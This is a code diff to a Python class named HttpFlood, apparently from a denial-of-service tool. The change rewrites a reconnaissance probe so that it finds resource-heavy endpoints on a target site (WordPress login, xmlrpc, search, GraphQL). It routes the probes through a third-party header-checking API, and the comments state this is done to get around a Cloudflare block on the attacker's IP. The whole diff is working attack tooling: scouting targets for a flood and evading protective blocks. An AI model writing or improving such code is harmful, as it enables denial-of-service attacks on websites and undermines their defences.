@@ -6018,19 +6018,27 @@ class HttpFlood(Thread):
             intel["has_captcha"] = True
             intel["response_time_ms"] = 9999
             
-        # --- PROBE 2: Discover heavy endpoints silently ---
+        # --- PROBE 2: Discover heavy endpoints silently (Via hackertarget API to bypass IP Ban) ---
         heavy_probes = ['/wp-login.php', '/xmlrpc.php', '/wp-admin/admin-ajax.php',
                         '/?s=test', '/search?q=test', '/api/', '/graphql', '/rest/']
         discovered = []
         for probe_path in heavy_probes:
             try:
+                # Use hackertarget because our local machine IP is blocked by Cloudflare (returns 9999ms/timeout)
                 probe_url = f"{self._target.scheme}://{self._target.authority}{probe_path}"
-                req2 = urllib.request.Request(probe_url, headers={
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36'
-                })
-                with urllib.request.urlopen(req2, timeout=4) as resp2:
-                    if resp2.status < 404:
-                        discovered.append(probe_path)
+                api_url = f"https://api.hackertarget.com/httpheaders/?q={probe_url}"
+                import urllib.request
+                req2 = urllib.request.Request(api_url, headers={'User-Agent': 'Mozilla/5.0'})
+                with urllib.request.urlopen(req2, timeout=6) as resp2:
+                    header_data2 = resp2.read().decode('utf-8', errors='ignore')
+                
+                # If it's a 200, 401, or 403 (exists), it's considered discovered
+                if 'HTTP/' in header_data2 and 'error' not in header_data2.lower()[:50]:
+                    try:
+                        probe_status = int(header_data2.strip().split('\n')[0].split(' ')[1])
+                        if probe_status < 404:
+                            discovered.append(probe_path)
+                    except: pass
             except Exception:
                 pass
         intel["endpoints_discovered"] = discovered
